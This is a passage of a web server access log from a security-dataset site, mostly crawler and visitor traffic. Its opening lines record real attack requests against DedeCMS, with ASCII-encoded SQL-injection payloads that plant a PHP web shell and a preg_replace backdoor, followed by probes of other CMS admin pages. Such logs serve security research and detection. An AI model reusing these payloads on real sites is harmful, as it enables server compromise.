5B%5D=48&arrs2%5B%5D=115&arrs2%5B%5D=101&arrs2%5B%5D=99&arrs2%5B%5D=46&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=103&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=59&arrs2%5B%5D=64&arrs2%5B%5D=112&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=103&arrs2%5B%5D=95&arrs2%5B%5D=114&arrs2%5B%5D=101&arrs2%5B%5D=112&arrs2%5B%5D=108&arrs2%5B%5D=97&arrs2%5B%5D=99&arrs2%5B%5D=101&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=47&arrs2%5B%5D=91&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=112&arrs2%5B%5D=121&arrs2%5B%5D=114&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=104&arrs2%5B%5D=116&arrs2%5B%5D=93&arrs2%5B%5D=47&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=36&arrs2%5B%5D=95&arrs2%5B%5D=82&arrs2%5B%5D=69&arrs2%5B%5D=81&arrs2%5B%5D=85&arrs2%5B%5D=69&arrs2%5B%5D=83&arrs2%5B%5D=84&arrs2%5B%5D=91&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=103&arrs2%5B%5D=117&arrs2%5B%5D=105&arrs2%5B%5D=103&arrs2%5B%5D=101&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=93&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=101&arrs2%5B%5D=114&arrs2%5B%5D=114&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=63&arrs2%5B%5D=62&arrs2%5B%5D=39&arrs2%5B%5D=41&arrs2%5B%5D=59&arrs2%5B%5D=0 HTTP/1.1" 404 305 "http://www.secrepo.com/plus/mytag_js.php?dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=57&arrs2[]=48&arrs2[]=57&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=99&arrs2[]=104&arrs2[]=111&arrs2[]=32&arrs2[]=39&arrs2[]=39&arrs2[]=100&arrs2[]=101&arrs2[]=100&arrs2[]=101&arrs2[]=99&arrs2[]=109&arrs2[]=115&arrs2[]=32&arrs2[]=53&arrs2[]=46&arrs2[]=55&arrs2[]=32&arrs2[]=48&arrs2[]=100&arrs2[]=97&arrs2[]=121&arrs2[]=60&arrs2[]=98&arrs2[]=114&arrs2[]=62&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=44&arrs2[]=32&arrs2[]=57&arrs2[]=48&arrs2[]=115&arrs2[]=101&arrs2[]=99&arrs2[]=46&arrs2[]=111&arrs2[]=114&arrs2[]=103&arrs2[]=39&arrs2[]=39&arrs2[]=59&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=103&arrs2[]=117&arrs2[]=105&arrs2[]=103&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:31 -0700] "GET /plus/download.php?open=1&arrs1%5B%5D=99&arrs1%5B%5D=102&arrs1%5B%5D=103&arrs1%5B%5D=95&arrs1%5B%5D=100&arrs1%5B%5D=98&arrs1%5B%5D=112&arrs1%5B%5D=114&arrs1%5B%5D=101&arrs1%5B%5D=102&arrs1%5B%5D=105&arrs1%5B%5D=120&arrs2%5B%5D=109&arrs2%5B%5D=121&arrs2%5B%5D=97&arrs2%5B%5D=100&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=83&arrs2%5B%5D=69&arrs2%5B%5D=84&arrs2%5B%5D=32&arrs2%5B%5D=96&arrs2%5B%5D=110&arrs2%5B%5D=111&arrs2%5B%5D=114&arrs2%5B%5D=109&arrs2%5B%5D=98&arrs2%5B%5D=111&arrs2%5B%5D=100&arrs2%5B%5D=121&arrs2%5B%5D=96&arrs2%5B%5D=32&arrs2%5B%5D=61&arrs2%5B%5D=32&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=102&arrs2%5B%5D=105&arrs2%5B%5D=108&arrs2%5B%5D=101&arrs2%5B%5D=95&arrs2%5B%5D=112&arrs2%5B%5D=117&arrs2%5B%5D=116&arrs2%5B%5D=95&arrs2%5B%5D=99&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=101&arrs2%5B%5D=110&arrs2%5B%5D=116&arrs2%5B%5D=115&arrs2%5B%5D=40&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=109&arrs2%5B%5D=111&arrs2%5B%5D=111&arrs2%5B%5D=110&arrs2%5B%5D=46&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=44&arrs2%5B%5D=39&arrs2%5B%5D=39&arrs2%5B%5D=60&arrs2%5B%5D=63&arrs2%5B%5D=112&arrs2%5B%5D=104&arrs2%5B%5D=112&arrs2%5B%5D=32&arrs2%5B%5D=101&arrs2%5B%5D=118&arrs2%5B%5D=97&arrs2%5B%5D=108&arrs2%5B%5D=40&ar HTTP/1.1" 418 746 "http://www.secrepo.com/plus/download.php?open=1&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=97&arrs2[]=100&arrs2[]=96&arrs2[]=32&arrs2[]=83&arrs2[]=69&arrs2[]=84&arrs2[]=32&arrs2[]=96&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=96&arrs2[]=32&arrs2[]=61&arrs2[]=32&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=102&arrs2[]=105&arrs2[]=108&arrs2[]=101&arrs2[]=95&arrs2[]=112&arrs2[]=117&arrs2[]=116&arrs2[]=95&arrs2[]=99&arrs2[]=111&arrs2[]=110&arrs2[]=116&arrs2[]=101&arrs2[]=110&arrs2[]=116&arrs2[]=115&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=109&arrs2[]=111&arrs2[]=111&arrs2[]=110&arrs2[]=46&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=101&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=40&ar" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:31 -0700] "POST /admin_aspcms/_system/AspCms_SiteSetting.asp HTTP/1.1" 404 328 "http://www.secrepo.com/admin_aspcms/_system/AspCms_SiteSetting.asp" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
89.40.73.14 - - [20/Oct/2021:06:12:31 -0700] "POST /e/DoInfo/ecms.php HTTP/1.1" 404 305 "http://www.secrepo.com/e/DoInfo/ecms.php" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2)" 
216.244.66.245 - - [20/Oct/2021:06:16:06 -0700] "GET /self.logs/error.log.2021-08-18.gz HTTP/1.1" 200 4943 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:06:16:11 -0700] "GET /self.logs/error.log.2021-09-28.gz HTTP/1.1" 200 1334 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:06:16:20 -0700] "GET /Datasets%20Description/Network/ssl.html HTTP/1.1" 200 5065 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:06:16:54 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/dhcp.html HTTP/1.1" 200 4623 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:06:16:57 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/packet_filter.html HTTP/1.1" 200 4151 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:06:17:10 -0700] "GET /self.logs/error.log.2019-10-13 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:06:17:16 -0700] "GET /self.logs/error.log.2020-06-16 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [20/Oct/2021:06:17:49 -0700] "GET /self.logs/?C=N;O=D HTTP/1.1" 200 324638 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
114.119.149.78 - - [20/Oct/2021:06:19:10 -0700] "GET /self.logs/access.log.2020-06-22.gz HTTP/1.1" 200 12908 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
103.131.71.203 - - [20/Oct/2021:06:21:43 -0700] "GET /robots.txt HTTP/1.1" 301 458 "-" "Mozilla/5.0 (compatible; coccocbot-image/1.0; +http://help.coccoc.com/searchengine)" 
103.131.71.203 - - [20/Oct/2021:06:21:45 -0700] "GET /robots.txt HTTP/1.1" 200 340 "-" "Mozilla/5.0 (compatible; coccocbot-image/1.0; +http://help.coccoc.com/searchengine)" 
51.222.253.13 - - [20/Oct/2021:06:23:04 -0700] "GET /self.logs/error.log.2017-12-10.gz HTTP/1.1" 200 2435 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
194.186.207.107 - - [20/Oct/2021:06:23:10 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4255.0 Safari/537.36" 
194.186.207.107 - - [20/Oct/2021:06:23:13 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4255.0 Safari/537.36" 
194.186.207.107 - - [20/Oct/2021:06:23:13 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4255.0 Safari/537.36" 
194.186.207.107 - - [20/Oct/2021:06:23:13 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4255.0 Safari/537.36" 
194.186.207.107 - - [20/Oct/2021:06:23:14 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4255.0 Safari/537.36" 
194.186.207.107 - - [20/Oct/2021:06:23:35 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4255.0 Safari/537.36" 
114.119.149.90 - - [20/Oct/2021:06:24:22 -0700] "GET /self.logs/access.log.2019-04-03.gz HTTP/1.1" 200 28973 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
194.186.207.107 - - [20/Oct/2021:06:27:42 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4255.0 Safari/537.36" 
194.186.207.107 - - [20/Oct/2021:06:27:44 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4255.0 Safari/537.36" 
194.186.207.107 - - [20/Oct/2021:06:27:49 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4255.0 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:27:52 -0700] "GET / HTTP/1.1" 200 13183 "-" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:27:52 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36" 
79.176.131.175 - - [20/Oct/2021:06:28:19 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1651 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
79.176.131.175 - - [20/Oct/2021:06:28:19 -0700] "GET /favicon.ico HTTP/1.1" 200 368 "http://www.secrepo.com/Datasets%20Description/PE_malware/VirusShare.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
79.176.131.175 - - [20/Oct/2021:06:28:19 -0700] "GET /robots.txt?1634736499562 HTTP/1.1" 200 377 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
114.119.149.89 - - [20/Oct/2021:06:29:35 -0700] "GET /self.logs/access.log.2017-08-27.gz HTTP/1.1" 200 20038 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
114.119.149.90 - - [20/Oct/2021:06:34:46 -0700] "GET /self.logs/error.log.2020-09-25.gz HTTP/1.1" 200 1338 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
118.184.177.111 - - [20/Oct/2021:06:38:27 -0700] "GET / HTTP/1.1" 200 13147 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)" 
114.119.149.90 - - [20/Oct/2021:06:40:00 -0700] "GET /self.logs/2015/access.log.2015-02-27.gz HTTP/1.1" 200 3281 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
66.249.66.86 - - [20/Oct/2021:06:42:28 -0700] "GET / HTTP/1.1" 200 13184 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
114.119.135.212 - - [20/Oct/2021:06:45:11 -0700] "GET /self.logs/access.log.2018-11-21.gz HTTP/1.1" 200 69036 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
51.222.253.20 - - [20/Oct/2021:06:49:40 -0700] "GET /self.logs/error.log.2017-08-22.gz HTTP/1.1" 200 987 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)" 
49.204.231.174 - - [20/Oct/2021:06:55:35 -0700] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1651 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50" 
49.204.231.174 - - [20/Oct/2021:06:55:36 -0700] "GET /favicon.ico HTTP/1.1" 200 368 "http://www.secrepo.com/Datasets%20Description/PE_malware/VirusShare.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50" 
49.204.231.174 - - [20/Oct/2021:06:55:45 -0700] "GET / HTTP/1.1" 200 13184 "http://www.secrepo.com/Datasets%20Description/PE_malware/VirusShare.html" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50" 
49.204.231.174 - - [20/Oct/2021:06:55:45 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50" 
49.204.231.174 - - [20/Oct/2021:06:55:45 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50" 
49.204.231.174 - - [20/Oct/2021:06:55:45 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7556 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50" 
49.204.231.174 - - [20/Oct/2021:06:55:46 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50" 
49.204.231.174 - - [20/Oct/2021:06:56:49 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 Edg/94.0.992.50" 
219.74.97.4 - - [20/Oct/2021:06:58:16 -0700] "GET / HTTP/1.1" 200 13184 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:58:17 -0700] "GET /css/style.css HTTP/1.1" 404 305 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:58:17 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27916 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:58:17 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7533 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:58:18 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 690 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:58:28 -0700] "GET /self.logs/ HTTP/1.1" 200 32341 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:58:30 -0700] "GET /favicon.ico HTTP/1.1" 200 368 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:58:41 -0700] "GET /self.logs/error.log.2021-10-17.gz HTTP/1.1" 200 2378 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:06:58:57 -0700] "GET /self.logs/access.log.2021-10-17.gz HTTP/1.1" 200 16207 "http://www.secrepo.com/self.logs/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
114.119.149.71 - - [20/Oct/2021:07:00:52 -0700] "GET /self.logs/2015/access.log.2015-03-04.gz HTTP/1.1" 200 3547 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
219.74.97.4 - - [20/Oct/2021:07:03:12 -0700] "GET /css/style.css HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:04:16 -0700] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 619 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:04:16 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1" 200 811 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:04:21 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/http.html HTTP/1.1" 200 2034 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_1/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:04:33 -0700] "GET /Datasets%20Description/HTML_Bro_log_3 HTTP/1.1" 301 619 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:04:33 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/ HTTP/1.1" 200 800 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:04:51 -0700] "GET /Datasets%20Description/Network/http.html HTTP/1.1" 200 1709 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:04:53 -0700] "GET /Datasets%20Description/Network/signatures.html HTTP/1.1" 404 328 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:04:56 -0700] "GET /Datasets%20Description/Network/weird.html HTTP/1.1" 200 1645 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:05:10 -0700] "GET /Datasets%20Description/HTML_Bro_log_3/weird.html HTTP/1.1" 200 1931 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_3/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:05:32 -0700] "GET /Datasets%20Description/HTML_Bro_log_2 HTTP/1.1" 301 619 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:05:33 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/ HTTP/1.1" 200 809 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:05:38 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/packet_filter.html HTTP/1.1" 200 1725 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_2/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
219.74.97.4 - - [20/Oct/2021:07:05:43 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/notice.html HTTP/1.1" 200 2006 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_2/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
85.208.98.18 - - [20/Oct/2021:07:06:04 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; SemrushBot; +http://www.semrush.com/bot.html)" 
85.208.98.18 - - [20/Oct/2021:07:06:08 -0700] "HEAD / HTTP/1.1" 200 359 "-" "Mozilla/5.0 (compatible; SemrushBot; +http://www.semrush.com/bot.html)" 
